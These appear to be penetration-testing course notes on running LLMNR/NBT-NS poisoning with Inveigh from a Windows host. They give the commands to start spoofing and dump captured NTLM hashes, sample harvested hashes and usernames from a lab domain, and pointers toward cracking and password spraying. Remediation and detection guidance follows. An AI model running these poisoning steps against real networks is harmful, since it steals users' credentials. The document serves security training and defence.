## LLMNR/NBT-NS Poisoning from a Windows Host

This section covers running LLMNR and NBT-NS poisoning attacks from a Windows machine using [Inveigh](https://github.com/Kevin-Robertson/Inveigh), the Windows equivalent of Responder.

***

## Inveigh Overview

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a spoofing and poisoning tool written in both PowerShell and C#. It functions similarly to Responder but runs natively on Windows. You would use it when you have obtained a Windows attack box, a client provides a Windows host for testing, or you land on a Windows host as a local admin and want to expand access.

Inveigh supports the following protocols:

- IPv4 and IPv6
- LLMNR, DNS, mDNS, NBNS
- DHCPv6, ICMPv6
- HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth

The tool is located at `C:\Tools` on the provided Windows attack host.

***

## PowerShell Version

### Loading and Listing Parameters

Import the module and list all available parameters. The full parameter reference is available on the [Inveigh wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters):

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

This outputs a full parameter list including options for spoofing, capture, output, and protocol control.

### Starting Inveigh with LLMNR and NBNS Spoofing

Run the following command to enable LLMNR and NBNS spoofing with console and file output. Default parameter values are documented on the [Inveigh parameter help page](https://github.com/Kevin-Robertson/Inveigh#parameter-help):

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Key output lines to note on startup:

```
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] LLMNR Spoofer = Enabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
```

Once running, Inveigh immediately begins receiving and responding to LLMNR and mDNS requests from hosts on the network.

***

## C# Version (InveighZero)

The PowerShell version of [Inveigh](https://github.com/Kevin-Robertson/Inveigh) is no longer updated. The C# version (InveighZero) is the actively maintained build and combines the original C# PoC with a C# port of the PowerShell code. A compiled executable is included at `C:\Tools`, but compiling it yourself via Visual Studio is best practice.

### Running the Executable

```powershell
.\Inveigh.exe
```

On startup, the tool displays active and inactive listeners. Lines prefixed with `[+]` are enabled by default. Lines prefixed with `[ ]` are disabled. Example:

```
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[+] SMB Packet Sniffer [Port 445]
[+] LDAP Listener [Port 389]
[+] File Output [C:\Tools]
[*] Press ESC to enter/exit interactive console
```

***

## Interactive Console

Press `ESC` while Inveigh is running to enter the interactive console. Type `HELP` to view all available commands:

```
GET CONSOLE          | get queued console output
GET NTLMV1           | get captured NTLMv1 hashes
GET NTLMV2           | get captured NTLMv2 hashes
GET NTLMV1UNIQUE     | get one NTLMv1 hash per user
GET NTLMV2UNIQUE     | get one NTLMv2 hash per user
GET NTLMV1USERNAMES  | get usernames and IPs for NTLMv1 hashes
GET NTLMV2USERNAMES  | get usernames and IPs for NTLMv2 hashes
GET CLEARTEXT        | get captured cleartext credentials
GET CLEARTEXTUNIQUE  | get unique cleartext credentials
STOP                 | stop Inveigh
RESUME               | resume real time console output
HISTORY              | get command history
```

### Viewing Captured Hashes

To retrieve unique NTLMv2 hashes:

```
GET NTLMV2UNIQUE
```

Example output:

```
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F...
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E...
```

### Viewing Captured Usernames

To list usernames alongside their source IPs and NTLM challenges:

```
GET NTLMV2USERNAMES
```

Example output:

```
172.16.5.125  | ACADEMY-EA-FILE  | INLANEFREIGHT\backupagent   | B5013246091943D7
172.16.5.125  | ACADEMY-EA-FILE  | INLANEFREIGHT\forend        | 32FD89BD78804B04
172.16.5.125  | ACADEMY-EA-FILE  | INLANEFREIGHT\clusteragent  | 28BF08D82FA998E4
172.16.5.125  | ACADEMY-EA-FILE  | INLANEFREIGHT\wley          | 277AC2ED022DB4F7
172.16.5.125  | ACADEMY-EA-FILE  | INLANEFREIGHT\svc_qualys    | 5F9BB670D23F23ED
```

This username list is useful for targeted offline cracking or further enumeration.

***

## Remediation

MITRE ATT&CK tracks this technique as [T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001). Always test these changes carefully in a staging environment before rolling them out across a production network.

### Disable LLMNR via Group Policy

Navigate to:

```
Computer Configuration --> Administrative Templates --> Network --> DNS Client
```

Enable the setting: **Turn OFF Multicast Name Resolution**

### Disable NBT-NS Locally

1. Open Control Panel and go to Network and Sharing Center
2. Click Change adapter settings
3. Right-click the adapter and select Properties
4. Select Internet Protocol Version 4 (TCP/IPv4) and click Properties
5. Click Advanced, go to the WINS tab, and select Disable NetBIOS over TCP/IP

### Disable NBT-NS via Startup Script (GPO)

NBT-NS cannot be disabled directly through Group Policy, but you can deploy a PowerShell startup script to handle it:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

To deploy via GPO:

1. Open the Local Group Policy Editor
2. Navigate to `Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup`
3. Go to the PowerShell Scripts tab
4. Set scripts to run in the following order: Run Windows PowerShell scripts first
5. Click Add and point to the script

Host the script on the SYSVOL share and reference it via UNC path:

```
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

The script runs on the next reboot of each targeted host, provided the file remains accessible on SYSVOL.

### Additional Mitigations

- Filter network traffic to block LLMNR and NetBIOS traffic
- Enable SMB Signing to prevent NTLM relay attacks
- Deploy network intrusion detection and prevention systems
- Use network segmentation to isolate hosts that require LLMNR or NBT-NS

***

## Detection

When disabling the protocols is not possible, detection becomes necessary. The following approaches cover active and passive detection:

- Inject LLMNR and NBT-NS requests for non-existent hosts across different subnets and alert on any responses, as a valid response indicates an attacker is spoofing name resolution. The [Praetorian blog post on detecting BNRP](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) covers this method in depth
- Monitor hosts for traffic on UDP port 5355 (LLMNR) and UDP port 137 (NBT-NS)
- Monitor Windows [Event ID 4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [Event ID 7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) for suspicious service installations
- Monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value, where a value of `0` confirms LLMNR is disabled

***

## Next Steps

With captured hashes in hand, the next step is to run enumeration using a tool such as [BloodHound](https://github.com/BloodHoundAD/BloodHound) to determine whether any of the accounts have privileged access worth pursuing. Successfully cracking a hash for a privileged account, or even a Domain Admin, opens up significant paths forward. If hash cracking does not yield useful results, password spraying is the logical next step.
